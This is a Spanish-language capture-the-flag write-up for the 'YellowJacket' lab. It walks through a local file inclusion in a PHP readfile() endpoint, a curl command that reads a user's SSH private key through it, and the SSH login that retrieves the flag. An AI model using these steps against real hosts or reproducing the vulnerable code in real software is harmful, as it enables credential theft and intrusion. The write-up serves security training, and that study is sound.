# YellowJacket — WHOAMI-LABS.COM

**Laboratorio:** YellowJacket
**Categoría:** LFI / exposición de clave SSH
**Dificultad:** difícil (5 puntos)
**Objetivo:** `172.17.0.2`
**Estado:** resuelto a nivel de usuario

## Resumen

El servicio HTTP expone `report.php`, que lee directamente el parámetro `file`
con `readfile()`. La lectura arbitraria permitió obtener la clave privada SSH de
`vince`. Esa clave abrió el servicio SSH publicado en el puerto `2222`, donde
`/home/vince/user.txt` contenía la flag.

## Enumeración

```text
80/tcp   open  http  Apache httpd 2.4.66 (Debian)
2222/tcp open  ssh   OpenSSH 8.4p1 Debian
```

La raíz web sólo mostraba la página de Stinger Solutions. La enumeración de
rutas encontró `report.php` e `inventory.php`. El primero respondió:

```php
<?php $file = $_GET['file']; if(isset($file)){ readfile($file); } else { echo 'No file specified'; } ?>
```

También se observó que `inventory.php` concatena `batch` en una consulta SQLite,
pero el endpoint devolvía `500`; no fue necesario usarlo para completar el reto.

## Acceso inicial mediante LFI

La lectura de `/etc/passwd` confirmó las cuentas `stinger` y `vince`. Después se
leyó `/home/vince/.ssh/id_rsa` mediante:

```bash
curl -G --data-urlencode 'file=/home/vince/.ssh/id_rsa' \
  http://172.17.0.2/report.php -o vince
chmod 600 vince
```

No se incluye la clave privada en el repositorio. Su huella observada fue:

```text
SHA256:RvqLLrL9nBRV94rH8Odoz0PNBTiRVNP3PEhuCTF5PM4
```

## Flag

```bash
ssh -i vince -p 2222 vince@172.17.0.2
cat ~/user.txt
```

Resultado:

```text
Whoami{y3ll0w_j4ck3t_w3b_p3n_t3st3r}
```

La cuenta no tenía permisos `sudo`, capacidades adicionales ni binarios SUID
personalizados; no se observó una segunda flag de root en este escenario.

## Lección

Un endpoint que pasa rutas controladas por el usuario a `readfile()` convierte
todo archivo legible por el proceso web en una fuente de credenciales. Las claves
privadas nunca deben estar expuestas ni siquiera con permisos de lectura
aparentemente inocuos, y el acceso SSH debe restringirse con autorización y
permisos correctos.
